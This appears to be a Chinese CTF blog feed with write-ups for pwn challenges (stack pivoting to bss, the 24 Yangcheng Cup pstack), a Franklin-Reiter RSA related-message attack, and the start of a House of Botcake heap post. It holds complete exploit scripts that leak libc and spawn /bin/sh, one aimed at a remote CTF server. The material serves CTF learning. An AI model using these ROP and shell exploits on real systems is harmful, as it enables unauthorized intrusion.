class="line">context(arch=<span class="string">&#x27;i386&#x27;</span>,log_level=<span class="string">&#x27;debug&#x27;</span>)</span><br><span class="line"></span><br><span class="line">p = remote(<span class="string">&quot;node5.buuoj.cn&quot;</span>,<span class="number">27305</span>)</span><br><span class="line"><span class="comment">#p = process(&quot;./pwn&quot;)</span></span><br><span class="line">elf = ELF(<span class="string">&quot;./pwn&quot;</span>)</span><br><span class="line">main = <span class="number">0x08048513</span></span><br><span class="line">write_plt = elf.plt[<span class="string">&#x27;write&#x27;</span>]</span><br><span class="line">write_got = elf.got[<span class="string">&#x27;write&#x27;</span>]</span><br><span class="line">bss = <span class="number">0x0804A300</span></span><br><span class="line">leave_ret = <span class="number">0x08048408</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># 布置ROP链，准备泄漏libc</span></span><br><span class="line">p.recvuntil(<span class="string">&quot;What is your name?&quot;</span>)</span><br><span class="line">payload = flat(write_plt,main,<span class="number">1</span>,write_got,<span class="number">4</span>)</span><br><span class="line">p.send(payload)</span><br><span class="line"></span><br><span class="line"><span class="comment"># 栈迁移到bss</span></span><br><span class="line">p.recv()</span><br><span class="line">payload = cyclic(<span class="number">0x18</span>)+p32(bss-<span class="number">0x4</span>)+p32(leave_ret)</span><br><span class="line">p.send(payload)</span><br><span class="line"></span><br><span class="line"><span class="comment"># 泄漏libc</span></span><br><span class="line">write_addr = u32(p.recv(<span class="number">4</span>))</span><br><span class="line">success(<span class="string">&quot;write address: &quot;</span>+<span class="built_in">hex</span>(write_addr))</span><br><span class="line">libc = ELF(<span class="string">&quot;libc-2.23.so&quot;</span>)</span><br><span class="line">base = write_addr - libc.sym[<span class="string">&#x27;write&#x27;</span>]</span><br><span class="line">system = base + libc.sym[<span class="string">&#x27;system&#x27;</span>]</span><br><span class="line">bin_sh = base + <span class="built_in">next</span>(libc.search(<span class="string">b&#x27;/bin/sh\x00&#x27;</span>))</span><br><span class="line"></span><br><span class="line"><span class="comment"># 同样的操作再来一次即可</span></span><br><span class="line">p.recvuntil(<span class="string">&quot;What is your name?&quot;</span>)</span><br><span class="line">payload = flat(system,<span class="number">0xdead</span>,bin_sh)</span><br><span class="line">p.send(payload)</span><br><span class="line"></span><br><span class="line">p.recv()</span><br><span class="line">payload = cyclic(<span class="number">0x18</span>)+p32(bss-<span class="number">4</span>)+p32(leave_ret)</span><br><span class="line">p.send(payload)</span><br><span class="line">p.interactive()</span><br></pre></td></tr></table></figure></div><h2 id="思考"><a href="#思考" class="headerlink" title="思考"></a>思考</h2><ul><li>该题目是可以往bss段上面读入东西，然后栈迁移执行即可，那万一失去了往bss段读的权力呢？比如说没有第一个read，还可以写吗？</li><li>其实还是可以的，通过read的函数实现，看到下一题</li></ul><h1 id="24羊城杯pstack"><a href="#24羊城杯pstack" class="headerlink" title="24羊城杯pstack"></a>24羊城杯pstack</h1><p>附件下载地址：<br>链接：<a class="link" href="https://pan.baidu.com/s/1TNRnyduX8HTeAFWrAywdww?pwd=4sco">https://pan.baidu.com/s/1TNRnyduX8HTeAFWrAywdww?pwd=4sco <i class="fa-regular fa-arrow-up-right-from-square fa-sm"></i></a><br>提取码：4sco </p><h2 id="通过read拓展”栈空间”"><a href="#通过read拓展”栈空间”" class="headerlink" title="通过read拓展”栈空间”"></a><mark>通过read拓展”栈空间”<mark></mark></mark></h2><div class="highlight-container" data-rel="C"><figure class="iseeu highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="type">ssize_t</span> <span class="title function_">vuln</span><span class="params">()</span></span><br><span class="line">&#123;</span><br><span class="line">  <span class="type">char</span> buf[<span class="number">48</span>]; <span class="comment">// [rsp+0h] [rbp-30h] BYREF</span></span><br><span class="line">  <span class="built_in">puts</span>(<span class="string">&quot;Can you grasp this little bit of overflow?&quot;</span>);</span><br><span class="line">  <span class="keyword">return</span> read(<span class="number">0</span>, buf, <span class="number">0x40</span>uLL);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></div><ul><li>代码很简单，64位程序，相当于上题去掉了第一个read，然后其余都是一样的，可以溢出两个字长，打栈迁移，但是我们没有栈地址，也没有提前往bss段布置好ROP链，那就不可以写了吗？看到<code>read的汇编</code></li></ul><p><img lazyload src="/images/loading.svg" data-src="/../capture_20241024005908445.bmp"></p><ul><li><mark>关键点就在这里<mark></mark></mark></li></ul><div class="highlight-container" data-rel="Plaintext"><figure class="iseeu highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">fd -&gt; rdi -&gt; rax -&gt; [rbp+buf]</span><br></pre></td></tr></table></figure></div><ul><li>我们的read是往rbp+buf的地址写入0x40的数据的，那么我们将rbp覆盖为bss+0x30，ret_addr改为<code>lea rax,[rbp+buf]</code>这条指令的地址(可记作<code>m_read</code>)，不就可以实现往bss段上读入数据，即提前布置好ROP链吗？！！</li></ul><h2 id="讲解"><a href="#讲解" class="headerlink" title="讲解"></a>讲解</h2><ul><li>第一步先用m_read往bss段上面写入ROP链，该ROP链用于泄露libc</li></ul><div class="highlight-container" data-rel="Python"><figure class="iseeu highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">p.recvuntil(<span class="string">&quot;Can you grasp this little bit of overflow?\n&quot;</span>)</span><br><span class="line">payload = cyclic(<span class="number">0x30</span>) + p64(bss) + p64(m_read)</span><br><span class="line">p.send(payload)</span><br><span class="line"></span><br><span class="line">payload = flat(bss,pop_rdi_ret,puts_got , puts_plt, m_read,<span class="number">0</span>)</span><br><span class="line">payload += p64(bss - <span class="number">0x30</span>) + p64(leave_ret)</span><br><span class="line">p.send(payload)</span><br></pre></td></tr></table></figure></div><p>这样程序会执行m_read，读入下方的payload</p><p>（1）第一个payload可以看到,rbp覆盖为bss，ret_addr为m_read</p><p><img lazyload src="/images/loading.svg" data-src="/../capture_20241024104747898.bmp"></p><p>(2)第二个payload是在<code>m_read</code>开始写入数据，注意看到rsp还是在栈上面的，说明你还可以通过栈溢出继续打栈迁移,需要注意，我们一次栈迁移肯定是不够的，所以要注意此时rbp不能是之前一段栈迁移一样填充垃圾数据，要填充为bss。</p><p><img lazyload src="/images/loading.svg" data-src="/../capture_20241024105020233.bmp"></p><ul><li>执行完ROP链之后会继续执行<code>m_read</code>，此时的rbp应该是多少呢？就是你给的<code>bss</code></li></ul><p>此时直接布置ROP链get shell即可</p><div class="highlight-container" data-rel="Python"><figure class="iseeu highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">payload = cyclic(<span class="number">0x20</span>)</span><br><span class="line">payload += flat(pop_rdi_ret,bin_sh,system,m_read)</span><br><span class="line"></span><br><span class="line">p.send(payload)</span><br><span class="line">p.interactive()</span><br></pre></td></tr></table></figure></div><p>解释一下这个payload，看下图：</p><p><img lazyload src="/images/loading.svg" data-src="/../capture_20241024125053652.bmp"></p><p>写入数据从<code>rbp-0x30</code>即0x601810写入，但是单纯的直接写入0x30的数据然后“栈溢出”写system(‘&#x2F;bin&#x2F;sh’)的ROP链能行吗？当然是不行的，你写了但是并不会执行，这里就要注意下面的<code>call read</code>了</p><div class="highlight-container" data-rel="Plaintext"><figure class="iseeu highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">call: push rip; jmp addr; ret</span><br></pre></td></tr></table></figure></div><p><mark>从上面可以看出，call完函数之后，会执行ret，即<code>pop rip</code>，此时将rsp改为ROP链的开头即可，但是注意，<code>call</code>会先<code>push rip</code>，会将rsp往低地址移动一个字长，即此时的rsp应该是0x601830,所以填充0x20的垃圾数据，然后布置ROP链即可。执行完syscall如下</mark></p><p><img lazyload src="/images/loading.svg" data-src="/../capture_20241024131138527.bmp"></p><ul><li>可以注意到下方我们已经布置好了ROP链，然后DISASM页面先放还有一个ret，即可以执行ROP链，从而get shell。</li><li>其实也可以发现，最后的m_read可有可无</li></ul><h2 id="完整EXP-1"><a href="#完整EXP-1" class="headerlink" title="完整EXP"></a>完整EXP</h2><div class="highlight-container" data-rel="Python"><figure class="iseeu highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line">context(arch=<span class="string">&#x27;amd64&#x27;</span>,log_level=<span class="string">&#x27;debug&#x27;</span>)</span><br><span class="line">context.terminal=<span class="string">&#x27;gnome-terminal&#x27;</span></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">bug</span>():</span><br><span class="line">    gdb.attach(p)</span><br><span class="line">    pause()</span><br><span class="line"></span><br><span class="line">p = process(<span class="string">&quot;./pwn&quot;</span>)</span><br><span class="line">elf = ELF(<span class="string">&quot;./pwn&quot;</span>)</span><br><span class="line">libc = ELF(<span class="string">&quot;/lib/x86_64-linux-gnu/libc.so.6&quot;</span>)</span><br><span class="line">m_read = <span class="number">0x4006C4</span></span><br><span class="line">bss = elf.bss()+<span class="number">0x800</span>+<span class="number">0x30</span></span><br><span class="line">puts_got = elf.got[<span class="string">&#x27;puts&#x27;</span>]</span><br><span class="line">puts_plt = elf.plt[<span class="string">&#x27;puts&#x27;</span>]</span><br><span class="line">vuln = <span class="number">0x4006B1</span> </span><br><span class="line">pop_rdi_ret = <span class="number">0x0000000000400773</span></span><br><span class="line">leave_ret = <span class="number">0x00000000004006db</span></span><br><span class="line">ret = <span class="number">0x0000000000400506</span></span><br><span class="line"></span><br><span class="line">p.recvuntil(<span class="string">&quot;Can you grasp this little bit of overflow?\n&quot;</span>)</span><br><span class="line">payload = cyclic(<span class="number">0x30</span>) + p64(bss) + p64(m_read)</span><br><span class="line">p.send(payload)</span><br><span class="line"></span><br><span class="line">payload = flat(bss,pop_rdi_ret,puts_got , puts_plt, m_read,<span class="number">0</span>)</span><br><span class="line">payload += p64(bss - <span class="number">0x30</span>) + p64(leave_ret)</span><br><span class="line">p.send(payload)</span><br><span class="line">puts_addr = u64(p.recvn(<span class="number">6</span>)+<span class="string">b&#x27;\x00\x00&#x27;</span>)</span><br><span class="line">base = puts_addr - libc.sym[<span class="string">&#x27;puts&#x27;</span>]</span><br><span class="line">system = base + libc.sym[<span class="string">&#x27;system&#x27;</span>]</span><br><span class="line">bin_sh = base + <span class="built_in">next</span>(libc.search(<span class="string">b&#x27;/bin/sh\x00&#x27;</span>))</span><br><span class="line"></span><br><span class="line">payload = cyclic(<span class="number">0x20</span>)</span><br><span class="line">payload += flat(pop_rdi_ret,bin_sh,system)</span><br><span class="line"></span><br><span class="line">p.send(payload)</span><br><span class="line">p.interactive()</span><br></pre></td></tr></table></figure></div><h1 id="进阶-2024NSSCTF秋季招新-不可名状的东西"><a href="#进阶-2024NSSCTF秋季招新-不可名状的东西" class="headerlink" title="进阶-2024NSSCTF秋季招新(不可名状的东西)"></a>进阶-2024NSSCTF秋季招新(不可名状的东西)</h1><p>通过百度网盘分享的文件：虽然不知道你在期待什么？.7z<br>链接：<a class="link" href="https://pan.baidu.com/s/1WyFc6Zz3dGCvwNKcrfx31w?pwd=vdfs">https://pan.baidu.com/s/1WyFc6Zz3dGCvwNKcrfx31w?pwd=vdfs <i class="fa-regular fa-arrow-up-right-from-square fa-sm"></i></a><br>提取码：vdfs </p>]]></content>
      
      
      
        <tags>
            
            <tag> ctf-pwn </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>Franklin-Reiter相关信息攻击</title>
      <link href="/2024/10/22/Franklin-Reiter%E7%9B%B8%E5%85%B3%E4%BF%A1%E6%81%AF%E6%94%BB%E5%87%BB/"/>
      <url>/2024/10/22/Franklin-Reiter%E7%9B%B8%E5%85%B3%E4%BF%A1%E6%81%AF%E6%94%BB%E5%87%BB/</url>
      
        <content type="html"><![CDATA[<h1 id><a href="#" class="headerlink" title></a></h1><h1 id="前言"><a href="#前言" class="headerlink" title="前言"></a>前言</h1><p>参考:<a class="link" href="https://blog.csdn.net/XiongSiqi_blog/article/details/130978226">这篇文章 <i class="fa-regular fa-arrow-up-right-from-square fa-sm"></i></a></p><p>装好sage：<a class="link" href="https://mirrors.aliyun.com/sagemath/win/SageMath-9.3-Installer-v0.6.3.exe">下载链接 <i class="fa-regular fa-arrow-up-right-from-square fa-sm"></i></a></p><h1 id="Franklin-Reiter介绍"><a href="#Franklin-Reiter介绍" class="headerlink" title="Franklin-Reiter介绍"></a>Franklin-Reiter介绍</h1><p>该攻击方法在于两个明文m1,m2，这两个明文利用同一个e和m，并且<code>m2和m1间具有线性关系</code>,例如：</p><div class="highlight-container" data-rel="Bash"><figure class="iseeu highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">m2 = a*m1 + b</span><br></pre></td></tr></table></figure></div><ul><li>并且给出了c1,c2</li></ul><div class="highlight-container" data-rel="Python"><figure class="iseeu highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">c1 = <span class="built_in">pow</span>(m1, e, n)</span><br><span class="line">c2 = <span class="built_in">pow</span>(m2, e, n)</span><br></pre></td></tr></table></figure></div><p><mark><code>知道c1,c2,a,b,n，那么m1是可解的</code><mark></mark></mark></p><p><font size="4"><mark>原理<mark></mark></mark></font></p><p><img lazyload src="/images/loading.svg" data-src="/../4d9cb6a54246a9e8e4019ae9b6be66a8.png"></p><ul><li>因此最后的解的形式其实是X-M的形式的，利用sage库中的Q.coefficients()[0]</li></ul><blockquote><p>Q.coefficients() —— 提取多项式Q中的系数，并且是升序排列<br>举个栗子：<br>f &#x3D; x^3 + 2x^2 -3x + 4<br>f.coefficients()<br>返回列表[4,-3,2,1]</p><p>f &#x3D; x^3 + 2x^2 + 4<br>f.coefficients()<br>返回列表[4,2,1] # 0省略</p></blockquote><h1 id="板子"><a href="#板子" class="headerlink" title="板子"></a>板子</h1><h2 id="题目"><a href="#题目" class="headerlink" title="题目"></a>题目</h2><div class="highlight-container" data-rel="Python"><figure class="iseeu highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> secret <span class="keyword">import</span> flag</span><br><span class="line"><span class="keyword">from</span> Crypto.Util.number <span class="keyword">import</span> *</span><br><span class="line"></span><br><span class="line">m1 = bytes_to_long(flag)</span><br><span class="line">N = getPrime(<span class="number">512</span>)*getPrime(<span class="number">512</span>)</span><br><span class="line">e = <span class="number">17</span></span><br><span class="line"></span><br><span class="line">c1 = <span class="built_in">pow</span>(m1, e, N)</span><br><span class="line"></span><br><span class="line">a = getRandomNBitInteger(<span class="number">512</span>)</span><br><span class="line">b = getRandomNBitInteger(<span class="number">512</span>)</span><br><span class="line">m2 = a * m1 + b</span><br><span class="line">c2 = <span class="built_in">pow</span>(m2, e, N)</span><br><span class="line"></span><br><span class="line"><span class="built_in">print</span>(N, a, b, c1, c2, sep=<span class="string">&quot;\n&quot;</span>)</span><br></pre></td></tr></table></figure></div><h2 id="EXP"><a href="#EXP" class="headerlink" title="EXP"></a>EXP</h2><div class="highlight-container" data-rel="Python"><figure class="iseeu highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> libnum</span><br><span class="line">n = ...</span><br><span class="line">c1 = ...</span><br><span class="line">c2 = ...</span><br><span class="line">a = ...</span><br><span class="line">b = ...</span><br><span class="line"><span class="keyword">def</span> <span class="title function_">franklinReiter</span>(<span class="params">n,e,c1,c2,a,b</span>):</span><br><span class="line">    R.&lt;X&gt; = Zmod(n)[]</span><br><span class="line">    f1 = X^e - c1</span><br><span class="line">    f2 = (X*a+ b)^e - c2</span><br><span class="line">    <span class="comment"># coefficient 0 = -m, which is what we wanted!</span></span><br><span class="line">    <span class="keyword">return</span> Integer(n-(compositeModulusGCD(f1,f2)).coefficients()[<span class="number">0</span>]) <span class="comment"># 系数</span></span><br><span class="line"></span><br><span class="line">  <span class="comment"># GCD is not implemented for rings over composite modulus in Sage</span></span><br><span class="line">  <span class="comment"># so we do our own implementation. Its the exact same as standard GCD, but with</span></span><br><span class="line">  <span class="comment"># the polynomials monic representation</span></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">compositeModulusGCD</span>(<span class="params">a, b</span>):</span><br><span class="line">    <span class="keyword">if</span>(b == <span class="number">0</span>):</span><br><span class="line">        <span class="keyword">return</span> a.monic()</span><br><span class="line">    <span class="keyword">else</span>:</span><br><span class="line">        <span class="keyword">return</span> compositeModulusGCD(b, a % b)</span><br><span class="line"></span><br><span class="line">m=franklinReiter(n,e,c1,c2,a,b)</span><br><span class="line"><span class="built_in">print</span>(libnum.n2s(<span class="built_in">int</span>(m)))</span><br></pre></td></tr></table></figure></div><h1 id="题目-1"><a href="#题目-1" class="headerlink" title="题目"></a>题目</h1><h2 id="NSSCTF"><a href="#NSSCTF" class="headerlink" title="NSSCTF"></a>NSSCTF</h2><div class="highlight-container" data-rel="Python"><figure class="iseeu highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br></pre></td><td class="code"><pre><span class="line">flag1=<span class="string">b&#x27;******&#x27;</span></span><br><span class="line"></span><br><span class="line">p = getPrime(<span class="number">512</span>)</span><br><span class="line">q = getPrime(<span class="number">512</span>)</span><br><span class="line">n = p*q</span><br><span class="line">e = <span class="number">3</span></span><br><span class="line">m1 = bytes_to_long(flag1)</span><br><span class="line">a = getPrime(<span class="number">128</span>)</span><br><span class="line">b = getPrime(<span class="number">128</span>)</span><br><span class="line">m2 = a*m1 + b</span><br><span class="line"></span><br><span class="line">hint1 = a**<span class="number">2</span> + a*b </span><br><span class="line">hint2 = b**<span class="number">2</span> + b*a</span><br><span class="line"></span><br><span class="line">c1 = <span class="built_in">pow</span>(m1, e, n)</span><br><span class="line">c2 = <span class="built_in">pow</span>(m2, e, n)</span><br><span class="line"></span><br><span class="line"><span class="built_in">print</span>(<span class="string">f&#x27;n = <span class="subst">&#123;n&#125;</span>&#x27;</span>)</span><br><span class="line"><span class="built_in">print</span>(<span class="string">f&#x27;hint1 = <span class="subst">&#123;hint1&#125;</span>&#x27;</span>)</span><br><span class="line"><span class="built_in">print</span>(<span class="string">f&#x27;hint2 = <span class="subst">&#123;hint2&#125;</span>&#x27;</span>)</span><br><span class="line"><span class="built_in">print</span>(<span class="string">f&#x27;c1 = <span class="subst">&#123;c1&#125;</span>&#x27;</span>)</span><br><span class="line"><span class="built_in">print</span>(<span class="string">f&#x27;c2 = <span class="subst">&#123;c2&#125;</span>&#x27;</span>)</span><br><span class="line"></span><br><span class="line"><span class="string">&#x27;&#x27;&#x27;</span></span><br><span class="line"><span class="string">n = 96294984374753089080583610747240203389088051930341615602841335596072081913930052484580770899610689065293206976889303327507604080242460321817406117877072425663471808350427893332726383611142246218026112051129578226014713958882307096859175042839198895428723757405196020266267824586199807170149650434306779718677   </span></span><br><span class="line"><span class="string">hint1 = 111128465335502483574544230236618721723785067258103368528600651970108082026274</span></span><br><span class="line"><span class="string">hint2 = 149777690555091648253749138438840244052377948686936166203166372618778229891842</span></span><br><span class="line"><span class="string">c1 = 19258639302759286032385037035129183959148363633353536085988651266927081471573889078520697158985164250184287591219408939982288951952002632371950165308028756191357634396067109728491154241759098403135297660541258808223827178690693818047525955978891748361038516201626720292976210372367169577574791733786601438737  </span></span><br><span class="line"><span class="string">c2 = 94728391095098686718854324913205273277837107275197779266203956111447917954217642996612375426900185362566372715775684730383657923112702380810451305560067414494793397392647318953106387697001580454130672044011060132072400728672015125332880303053556556640562753160804196189095016248121783366388642672259225712092  </span></span><br><span class="line"><span class="string">&#x27;&#x27;&#x27;</span></span><br></pre></td></tr></table></figure></div><ul><li>注意给出了hint1,hint2,二元二次方程组，可以用z3解出a,b</li></ul><div class="highlight-container" data-rel="Python"><figure class="iseeu highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> z3 <span class="keyword">import</span> *</span><br><span class="line"></span><br><span class="line">hint1 = ...</span><br><span class="line">hint2 = ...</span><br><span class="line">s = Solver()</span><br><span class="line"></span><br><span class="line">a,b = Ints(<span class="string">&#x27;a b&#x27;</span>)</span><br><span class="line">s.add(a**<span class="number">2</span> + a*b == hint1)</span><br><span class="line">s.add(b**<span class="number">2</span> + a*b == hint2)</span><br><span class="line"><span class="keyword">if</span> s.check() == sat:</span><br><span class="line">    m = s.model()</span><br><span class="line">    <span class="built_in">print</span>(m[a], m[b])</span><br><span class="line"><span class="comment"># a= 217562055747111316427029035559575901669 </span></span><br><span class="line"><span class="comment"># b= 293227681709108659093110186239101833877</span></span><br></pre></td></tr></table></figure></div><ul><li>然后直接套板子即可，但是对于sage来说libnum是外部库，要到sageShell下载，但是直接用</li></ul><div class="highlight-container" data-rel="Bash"><figure class="iseeu highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">sage -python -m pip install libnum-i https://pypi.tuna.tsinghua.edu.cn/simple</span><br></pre></td></tr></table></figure></div><p>会报错，要加上</p><div class="highlight-container" data-rel="Plaintext"><figure class="iseeu highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">--trusted-host pypi.tuna.tsinghua.edu.cn</span><br></pre></td></tr></table></figure></div><h2 id="exp"><a href="#exp" class="headerlink" title="exp"></a>exp</h2><div class="highlight-container" data-rel="Python"><figure class="iseeu highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br></pre></td><td class="code"><pre><span class="line">n = <span class="number">96294984374753089080583610747240203389088051930341615602841335596072081913930052484580770899610689065293206976889303327507604080242460321817406117877072425663471808350427893332726383611142246218026112051129578226014713958882307096859175042839198895428723757405196020266267824586199807170149650434306779718677</span>   </span><br><span class="line">hint1 = <span class="number">111128465335502483574544230236618721723785067258103368528600651970108082026274</span></span><br><span class="line">hint2 = <span class="number">149777690555091648253749138438840244052377948686936166203166372618778229891842</span></span><br><span class="line">c1 = <span class="number">19258639302759286032385037035129183959148363633353536085988651266927081471573889078520697158985164250184287591219408939982288951952002632371950165308028756191357634396067109728491154241759098403135297660541258808223827178690693818047525955978891748361038516201626720292976210372367169577574791733786601438737</span>  </span><br><span class="line">c2 = <span class="number">94728391095098686718854324913205273277837107275197779266203956111447917954217642996612375426900185362566372715775684730383657923112702380810451305560067414494793397392647318953106387697001580454130672044011060132072400728672015125332880303053556556640562753160804196189095016248121783366388642672259225712092</span> </span><br><span class="line">e=<span class="number">3</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> libnum</span><br><span class="line"><span class="keyword">import</span> gmpy2</span><br><span class="line"><span class="keyword">import</span> random</span><br><span class="line"><span class="keyword">def</span> <span class="title function_">franklinReiter</span>(<span class="params">n,e,c1,c2,a,b</span>):</span><br><span class="line">    R.&lt;X&gt; = Zmod(n)[]</span><br><span class="line">    f1 = X^e - c1</span><br><span class="line">    f2 = (X*a+ b)^e - c2</span><br><span class="line">    <span class="comment"># coefficient 0 = -m, which is what we wanted!</span></span><br><span class="line">    <span class="keyword">return</span> Integer(n-(compositeModulusGCD(f1,f2)).coefficients()[<span class="number">0</span>]) <span class="comment"># 系数</span></span><br><span class="line"></span><br><span class="line">  <span class="comment"># GCD is not implemented for rings over composite modulus in Sage</span></span><br><span class="line">  <span class="comment"># so we do our own implementation. Its the exact same as standard GCD, but with</span></span><br><span class="line">  <span class="comment"># the polynomials monic representation</span></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">compositeModulusGCD</span>(<span class="params">a, b</span>):</span><br><span class="line">    <span class="keyword">if</span>(b == <span class="number">0</span>):</span><br><span class="line">        <span class="keyword">return</span> a.monic()</span><br><span class="line">    <span class="keyword">else</span>:</span><br><span class="line">        <span class="keyword">return</span> compositeModulusGCD(b, a % b)</span><br><span class="line"></span><br><span class="line">total = <span class="number">0x18046866aad5439317601b1de20ad687a</span></span><br><span class="line"></span><br><span class="line">a=<span class="number">217562055747111316427029035559575901669</span> </span><br><span class="line">b=<span class="number">293227681709108659093110186239101833877</span></span><br><span class="line">m=franklinReiter(n,e,c1,c2,a,b)</span><br><span class="line"><span class="built_in">print</span>(libnum.n2s(<span class="built_in">int</span>(m)))</span><br><span class="line"><span class="comment"># b&#x27;ZcxKh0OHA4nmSOnyeKsfh44P8FukJ6VMmQlXsAAAAASUVORK5CYII=&#x27;</span></span><br></pre></td></tr></table></figure></div>]]></content>
      
      
      
        <tags>
            
            <tag> crypto </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>House Of Botcake</title>
      <link href="/2024/10/17/House-Of-Botcake/"/>
      <url>/2024/10/17/House-Of-Botcake/</url>
      
        <content type="html"><![CDATA[<h1 id><a href="#" class="headerlink" title></a></h1><h1 id="介绍"><a href="#介绍" class="headerlink" title="介绍"></a>介绍</h1><p><a class="link" href="https://xz.aliyun.com/t/12653?time__1311=GqGxuDRCG=d052x+xCq4mwn0DcjfT4D">参考文章 <i class="fa-regular fa-arrow-up-right-from-square fa-sm"></i></a></p><p><code>House Of Botcache</code>是用于绕过<code>tcache double free</code>检查的一种方法，在glibc2.29-2.31，对于tcache加入了<code>key</code>值来检测该tcache是否已经存在于tcache bins中，该方法就是借用<code>unsorted bin</code>来绕过double free的检查,下面跟着源码来分析一下。</p><h1 id="源码"><a href="#源码" class="headerlink" title="源码"></a>源码</h1><p><a class="link" href="https://elixir.bootlin.com/glibc/glibc-2.31/source/malloc/malloc.c#L2924">源码文档 <i class="fa-regular fa-arrow-up-right-from-square fa-sm"></i></a></p><p><mark><code>tcache</code>key值的引进<mark></mark></mark></p><ul><li>2984行</li></ul><div class="highlight-container" data-rel="C"><figure class="iseeu highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">typedef</span> <span class="class"><span class="keyword">struct</span> <span class="title">tcache_entry</span></span></span><br><span class="line"><span class="class">&#123;</span></span><br><span class="line">  <span class="class"><span class="keyword">struct</span> <span class="title">tcache_entry</span> *<span 